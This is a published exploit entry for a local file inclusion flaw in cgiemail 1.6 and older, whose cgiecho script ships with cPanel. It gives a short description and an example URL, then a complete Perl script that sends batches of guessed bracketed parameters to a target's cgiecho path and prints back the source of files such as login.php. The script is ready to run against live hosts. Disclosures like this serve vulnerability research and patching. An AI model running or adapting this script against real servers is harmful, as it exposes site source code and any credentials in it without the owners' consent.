# Exploit Title:    cgiemail local file inclusion
# Vendor Homepage:  http://web.mit.edu/wwwdev/cgiemail/webmaster.html
# Software Link:    http://web.mit.edu/wwwdev/cgiemail/cgiemail-1.6.tar.gz
# Version:          1.6 and older
# Date:             2016-09-27
 
# cgiecho a script included with cgiemail will return any file under a 
# websites document root if the file contains square brackets and the text
# within the brackets is guessable.
 
# cgiemail is currently shipped with cPanel and is enabled by default.
 
# Example: http://hostname/cgi-sys/cgiecho/login.php?&#039;pass&#039;=[&#039;pass&#039;] 
#          will display http://hostname/login.php if login.php contains $_POST[&#039;pass&#039;]
 
 
 
 
##
# cgiemail local file inclusion exploit
# Author: Finbar Crago <finbar.crago@gmail.com>
# https://github.com/finbar-crago/cgiemail-exploit
##
use strict;
use warnings;
use POSIX;
use LWP::UserAgent;
use HTML::Entities;
use Getopt::Long;
$|++; $\="\n"; $,=" ";
 
sub usage {
die <<"EOF";
 
cgiemail local file inclusion exploit
 
Usage: $0 [options] target
 
Options:
  --names         Check for names in commer separated list
  --num           Check for numbers
  --num-max       Maximum number to check (default 10)
  --batch         Number of arguments sent per request (default 10)
  --cgiecho-path  Path of cgiecho on server (default &#039;/cgi-sys/cgiecho/&#039;)
  --user-agent    Set user-agent (default &#039;Mozilla/5.0&#039;)
  --deley         Pause between requests in seconds (default 1)
  --timeout       Set connection timeout (default 10)
 
Example:
  $0 --num --names &#039;email,password&#039; http://hostname/login.php > login.php
 
EOF
}
 
my $names;
my $num = 0;
my $num_max = 10; 
my $batch = 10;
my $cgiecho_path = &#039;/cgi-sys/cgiecho&#039;;
my $user_agent = &#039;Mozilla/5.0&#039;;
my $timeout = 10;
my $deley = 1;
GetOptions(
    &#039;names=s&#039;      => \$names,
    &#039;num&#039;          => \$num,
    &#039;num-max=i&#039;    => \$num_max,
    &#039;batch=i&#039;      => \$batch,
 
    &#039;cgiecho-path&#039; => \$cgiecho_path,
    &#039;user-agent=s&#039; => \$user_agent,
    &#039;deley=i&#039;      => \$deley,
    &#039;timeout=i&#039;    => \$timeout,
);
 
usage unless
    defined $ARGV[0] &&
    $ARGV[0] =~ m|^(https?://)?([a-z\d.-]+)/?(.*)?|i;
 
my $conn=$1||&#039;http://&#039;;my $host=$2;my $path=$3||&#039;index.php&#039;;
my $url = "$conn$host/$cgiecho_path/$path";
my @list= ();
 
if($num){ push @list, $_ for 0..$num_max }
if($names){
    push @list, "%22$_%22","%27$_%27" for split/,/,$names;
}
 
 
my $ua = LWP::UserAgent->new;
$ua->agent($user_agent);
$ua->timeout($timeout);
 
$batch--;
my $i=0;
my $end = ceil($#list/$batch);
while($#list+1){
    my $args=&#039;?&#039;;
    my $to = ($#list > $batch)?$batch:$#list;
    $args.="$_=[$_]&" for @list[0..$to];
    @list = @list[$to+1..$#list];
 
    my $res = $ua->get($url.$args);
    die $res->status_line if !$res->content_is_html;
    my $html = $res->decoded_content;
    if($html !~ />cgiemail[\n\r ]*([\d.]+)/){
    print "cgiemail not found"  if !$i;
    print "cgiemail was here but now it&#039;s not..." if $i;
    exit -1;
    } print STDERR "detected cgiemail $1" if !$i;
 
    print STDERR "\e[Jrequest ".++$i." of $end...";
 
    if($res->code == 200){
    $html =~ m|<PRE>(.+)</PRE>|s;
    print decode_entities($1);
    print STDERR "success!";
    exit;
    }
 
    if($res->code == 500){
    if($html =~ m|500 Could not open template - No such file or directory|){
        print STDERR "the file /$path doesn&#039;t exist...";
    } 
    elsif($html =~ m|500 Empty template file|){
        print STDERR "/$path is a directory...";
    }
    else{
        print STDERR "unknown 500 error:";
        print STDERR $html;
    }
    exit -1;
    }
 
    select(undef,undef,undef,$deley); printf "\eM";
}
print STDERR "sorry, no match found for $path";
exit -1;

